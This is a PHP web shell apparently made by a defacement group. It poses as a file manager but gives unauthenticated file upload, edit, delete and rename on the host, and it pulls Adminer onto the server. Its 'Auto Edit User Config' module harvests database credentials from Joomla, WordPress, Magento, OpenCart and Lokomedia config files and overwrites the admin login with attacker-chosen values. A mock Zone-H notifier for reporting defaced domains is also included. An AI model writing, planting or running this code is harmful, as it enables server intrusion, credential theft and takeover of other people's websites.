<?php
$currentDir = isset($_POST['d']) && !empty($_POST['d']) ? base64_decode($_POST['d']) : getcwd();
$currentDir = str_replace("\\", "/", $currentDir);
$dir = $currentDir; // Needed for Adminer logic

// Adminer Download Panel
if (isset($_GET['DPH']) && $_GET['DPH'] == 'adminer') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        $result = curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
        return $result;
    }

    echo "<center><h2>Adminer Downloader</h2>";
    if (file_exists('adminer.php')) {
        echo "<font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font>";
    } else {
        if (adminer("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php", "adminer.php")) {
            echo "<font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font>";
        } else {
            echo "<font color=red>Failed to create adminer.php</font>";
        }
    }
    echo "</center>";
    exit;
}

// Simulated Zone-H Notifier
if (isset($_GET['DPH']) && $_GET['DPH'] == 'zoneh') {
    echo "<hr><center><h2>Zone-H Style Notifier (Simulated)</h2>";
    if (isset($_POST['submit'])) {
        $domainList = explode("\r\n", $_POST['url']);
        $nick = $_POST['nick'];
        echo "Notifier Archive: <a href='#' target='_blank'>http://zone-h.org/archive/notifier=$nick</a><br><br>";
        foreach ($domainList as $url) {
            $url = trim($url);
            if ($url) {
                echo htmlspecialchars($url) . " -> <font color=lime>SIMULATED_OK</font><br>";
            }
        }
    } else {
        echo "<form method='post'>
            <u>Defacer</u>: <br>
            <input type='text' name='nick' size='50' value='DPH'><br>
            <u>Domains</u>: <br>
            <textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
            <input type='submit' name='submit' value='Submit' style='width: 450px;'>
            </form>";
    }
    echo "</center><hr>";
    exit;
}

// Auto Edit User Config
if (isset($_GET['DPH']) && $_GET['DPH'] == 'edit_user') {
    function ambilkata($string, $start, $end) {
        $str = explode($start, $string);
        if (isset($str[1])) {
            $str = explode($end, $str[1]);
            return $str[0];
        }
        return '';
    }
    
    if (isset($_POST['hajar'])) {
        if (strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
            echo "username atau password harus lebih dari 6 karakter";
        } else {
            $user_baru = $_POST['user_baru'];
            $pass_baru = md5($_POST['pass_baru']);
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach($scan_conf as $file_conf) {
                if(!is_file("$conf/$file_conf")) continue;
                $config = file_get_contents("$conf/$file_conf");
                if(preg_match("/JConfig|joomla/",$config)) {
                    $dbhost = ambilkata($config,"host = '","'");
                    $dbuser = ambilkata($config,"user = '","'");
                    $dbpass = ambilkata($config,"password = '","'");
                    $dbname = ambilkata($config,"db = '","'");
                    $dbprefix = ambilkata($config,"dbprefix = '","'");
                    $prefix = $dbprefix."users";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilkata($config,"sitename = '","'");
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Joomla<br>";
                    if($site == '') {
                        echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
                    } else {
                        echo "Sitename => $site<br>";
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/WordPress/",$config)) {
                    $dbhost = ambilkata($config,"DB_HOST', '","'");
                    $dbuser = ambilkata($config,"DB_USER', '","'");
                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"DB_NAME', '","'");
                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
                    $prefix = $dbprefix."users";
                    $option = $dbprefix."options";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[ID];
                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[option_value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Wordpress<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/Magento|Mage_Core/",$config)) {
                    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
                    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
                    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
                    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
                    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
                    $prefix = $dbprefix."admin_user";
                    $option = $dbprefix."core_config_data";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Magento<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
                    $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
                    $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
                    $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"'DB_DATABASE', '","'");
                    $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
                    $prefix = $dbprefix."user";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $target = ambilkata($config,"HTTP_SERVER', '","'");
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => OpenCart<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
                    $dbhost = ambilkata($config,'server = "','"');
                    $dbuser = ambilkata($config,'username = "','"');
                    $dbpass = ambilkata($config,'password = "','"');
                    $dbname = ambilkata($config,'database = "','"');
                    $prefix = "users";
                    $option = "identitas";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                    $result = mysql_fetch_array($q);
                    $target = $result[alamat_website];
                    if($target == '') {
                        $target2 = $result[url];
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        if($target2 == '') {
                            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $cek_login3 = file_get_contents("$target2/adminweb/");
                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                            } else {
                                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                            }
                        }
                    } else {
                        $cek_login = file_get_contents("$target/adminweb/");
                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                        if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                        } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                        } else {
                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                        }
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Lokomedia<br>";
                    if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
                        echo $url_target2;
                    } else {
                        echo $url_target;
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit User Config</h1>
        <form method='post'>
        <input type='hidden' name='d' value='".base64_encode($currentDir)."'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='DPH' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='DPH690' placeholder='pass_baru'><br>
        <input type='submit' name='hajar' value='Sikat!' style='width: 215px;'>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
        exit;
    }
}

// Directory Navigation
$pathParts = explode("/", $currentDir);
echo "<div class=\"dir\">";
foreach ($pathParts as $k => $v) {
    if ($v == "" && $k == 0) {
        echo "<a href=\"javascript:void(0);\" onclick=\"postDir('/')\">/</a>";
        continue;
    }
    $dirPath = implode("/", array_slice($pathParts, 0, $k + 1));
    echo "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($dirPath) . "')\">$v</a>/";
}
echo "</div>";

// Upload
if (isset($_POST['s']) && isset($_FILES['u']) && $_FILES['u']['error'] == 0) {
    $fileName = $_FILES['u']['name'];
    $tmpName = $_FILES['u']['tmp_name'];
    $destination = $currentDir . '/' . $fileName;
    if (move_uploaded_file($tmpName, $destination)) {
        echo "<script>alert('Upload successful!'); postDir('" . addslashes($currentDir) . "');</script>";
    } else {
        echo "<script>alert('Upload failed!');</script>";
    }
}

// File/Folder Listing
$items = scandir($currentDir);
if ($items !== false) {
    echo "<table>";
    echo "<tr><th>Name</th><th>Size</th><th>Action</th></tr>";

    foreach ($items as $item) {
        $fullPath = $currentDir . '/' . $item;
        if ($item == '.' || $item == '..') continue;

        if (is_dir($fullPath)) {
            echo "<tr><td><a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($fullPath) . "')\">📁 $item</a></td><td>--</td><td>--</td></tr>";
        } else {
            $size = filesize($fullPath) / 1024;
            $size = $size >= 1024 ? round($size / 1024, 2) . 'MB' : round($size, 2) . 'KB';
            echo "<tr><td><a href=\"javascript:void(0);\" onclick=\"postOpen('" . addslashes($fullPath) . "')\">📄 $item</a></td><td>$size</td><td>"
                . "<a href=\"javascript:void(0);\" onclick=\"postDel('" . addslashes($fullPath) . "')\">Delete</a> | "
                . "<a href=\"javascript:void(0);\" onclick=\"postEdit('" . addslashes($fullPath) . "')\">Edit</a> | "
                . "<a href=\"javascript:void(0);\" onclick=\"postRen('" . addslashes($fullPath) . "', '$item')\">Rename</a>"
                . "</td></tr>";
        }
    }
    echo "</table>";
} else {
    echo "<p>Unable to read directory!</p>";
}

// Delete File
if (isset($_POST['del'])) {
    $filePath = base64_decode($_POST['del']);
    $fileDir = dirname($filePath);
    if (@unlink($filePath)) {
        echo "<script>alert('Delete successful'); postDir('" . addslashes($fileDir) . "');</script>";
    } else {
        echo "<script>alert('Delete failed'); postDir('" . addslashes($fileDir) . "');</script>";
    }
}

// Edit File
if (isset($_POST['edit'])) {
    $filePath = base64_decode($_POST['edit']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath)) {
        echo "<style>table{display:none;}</style>";
        echo "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($fileDir) . "')\">Back</a>";
        echo "<form method=\"post\">
            <input type=\"hidden\" name=\"obj\" value=\"" . $_POST['edit'] . "\">
            <input type=\"hidden\" name=\"d\" value=\"" . base64_encode($fileDir) . "\">
            <textarea name=\"content\">" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>
            <center><button type=\"submit\" name=\"save\">Save</button></center>
            </form>";
    }
}

// Save Edited File
if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
    $filePath = base64_decode($_POST['obj']);
    $fileDir = dirname($filePath);
    if (file_put_contents($filePath, $_POST['content'])) {
        echo "<script>alert('Saved'); postDir('" . addslashes($fileDir) . "');</script>";
    } else {
        echo "<script>alert('Save failed'); postDir('" . addslashes($fileDir) . "');</script>";
    }
}

// Rename
if (isset($_POST['ren'])) {
    $oldPath = base64_decode($_POST['ren']);
    $oldDir = dirname($oldPath);
    if (isset($_POST['new'])) {
        $newPath = $oldDir . '/' . $_POST['new'];
        if (rename($oldPath, $newPath)) {
            echo "<script>alert('Renamed'); postDir('" . addslashes($oldDir) . "');</script>";
        } else {
            echo "<script>alert('Rename failed'); postDir('" . addslashes($oldDir) . "');</script>";
        }
    } else {
        echo "<form method=\"post\">
            New Name: <input name=\"new\" type=\"text\">
            <input type=\"hidden\" name=\"ren\" value=\"" . $_POST['ren'] . "\">
            <input type=\"hidden\" name=\"d\" value=\"" . base64_encode($oldDir) . "\">
            <input type=\"submit\" value=\"Submit\">
            </form>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Manager + Adminer + ZoneH + AutoEditUser</title>
    <style>
        table { margin: 20px auto; border-collapse: collapse; width: 90%; }
        th, td { border: 1px solid #000; padding: 5px; text-align: left; }
        textarea { width: 100%; height: 300px; }
        .dir { margin: 20px; }
    </style>
    <script>
        function postDir(dir) {
            var form = document.createElement("form");
            form.method = "post";
            var input = document.createElement("input");
            input.name = "d";
            input.value = btoa(dir);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
        function postDel(path) {
            var form = document.createElement("form");
            form.method = "post";
            var input = document.createElement("input");
            input.name = "del";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
        function postEdit(path) {
            var form = document.createElement("form");
            form.method = "post";
            var input = document.createElement("input");
            input.name = "edit";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
        function postRen(path, name) {
            var newName = prompt("New name:", name);
            if (newName) {
                var form = document.createElement("form");
                form.method = "post";
                var input1 = document.createElement("input");
                input1.name = "ren";
                input1.value = btoa(path);
                var input2 = document.createElement("input");
                input2.name = "new";
                input2.value = newName;
                form.appendChild(input1);
                form.appendChild(input2);
                document.body.appendChild(form);
                form.submit();
            }
        }
        function postOpen(path) {
            window.open(atob(btoa(path)));
        }
    </script>
</head>
<body>
    <div class="dir">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="u">
            <input type="submit" name="s" value="Upload">
            <input type="hidden" name="d" value="<?php echo base64_encode($currentDir); ?>">
        </form>
        <div style="margin-top: 10px;">
            <a href="?DPH=adminer">Adminer Download</a> | 
            <a href="?DPH=zoneh">Zone-H Notifier</a> | 
            <a href="?DPH=edit_user">Auto Edit User Config</a>
        </div>
    </div>
</body>
</html>